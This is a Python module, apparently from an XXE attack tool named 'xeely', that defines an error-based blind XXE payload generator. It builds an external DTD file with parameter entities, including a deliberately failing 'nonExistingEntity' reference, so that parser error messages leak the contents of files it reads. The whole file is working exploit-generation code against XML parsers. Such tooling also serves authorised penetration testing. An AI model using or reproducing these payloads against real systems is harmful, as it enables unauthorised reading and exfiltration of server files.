from typing import Sequence

from xeely.custom_xml import XMLEntity
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload.abstract_payload import AbstractBlindPayloadGenerator
from xeely.xxe.attack.payload.factory import payload_factory


@payload_factory.register(name=XXEAttackMode.ERROR.value)
class ErrorBasedPayloadGenerator(AbstractBlindPayloadGenerator):
    def get_dtd_content(self) -> str:
        if self._should_use_cdata:
            content = super().get_dtd_content()
        else:
            entity = XMLEntity(
                name=self.MALICIOUS_ENTITY_NAME,
                value=self._get_malicious_entity_value(),
                is_parameter=True,
                is_external=True,
            ).to_xml()
            content = f"{entity}\n"

        error_entity_serialized = XMLEntity(
            name="error",
            value=XMLEntity(
                name="content",
                value=f"%nonExistingEntity;/%{self.MALICIOUS_ENTITY_NAME};",
                is_external=True,
            )
            .to_xml()
            .replace('"', "'"),
            is_parameter=True,
        ).to_xml()

        return f"{content}{error_entity_serialized}\n"

    def get_dtd_file_name(self) -> str:
        return "error.dtd"

    def _get_payload_entities(self) -> Sequence[XMLEntity | str]:
        return [
            *self._get_base_payload_entities(is_exploit_entity_a_parameter_one=True),
            "%eval;",
            "%error;",
        ]
